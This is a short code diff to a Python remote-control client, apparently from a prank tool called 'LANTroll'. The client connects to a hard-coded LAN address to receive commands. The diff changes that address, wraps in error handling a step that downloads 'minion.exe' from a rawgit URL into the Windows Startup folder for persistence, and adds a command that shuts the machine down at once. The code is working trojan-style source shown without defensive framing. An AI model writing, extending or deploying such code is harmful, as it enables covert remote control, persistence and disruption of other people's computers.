@@ -5,7 +5,7 @@ while True:
     s = socket.socket()
     port = 12345
     try:
-        s.connect(('10.64.41.234', port))
+        s.connect(('192.168.1.135', port))
         command = s.recv(1024)
         print("Command recieved: "+command)
     except socket.error as err:
@@ -157,7 +157,10 @@ loop
         downloadlocation = "C:"+path+"\AppData\\Roaming\\Microsoft\Windows\Start Menu\Programs\Startup\minion.exe"
         url = 'https://rawgit.com/kres0345/LANTroll/master/commander/minion.exe'
         print("Installing")
-        urllib.urlretrieve(url, downloadlocation)
+	try:
+            urllib.urlretrieve(url, downloadlocation)
+	except:
+            print("Well, somethings wrong")
         print("Done")
 
     elif "uninstall" in str(command1[0]):
@@ -181,6 +184,8 @@ loop
             pass
             #print("Not restarting becouse minion isnt installed in startup folder")
             #time.sleep(10)
-
+    elif "instantshutdown" in str(command1[0]):
+        subprocess.call(["shutdown", "-s", "-t", "0"])
+        
     time.sleep(10)
     s.close()
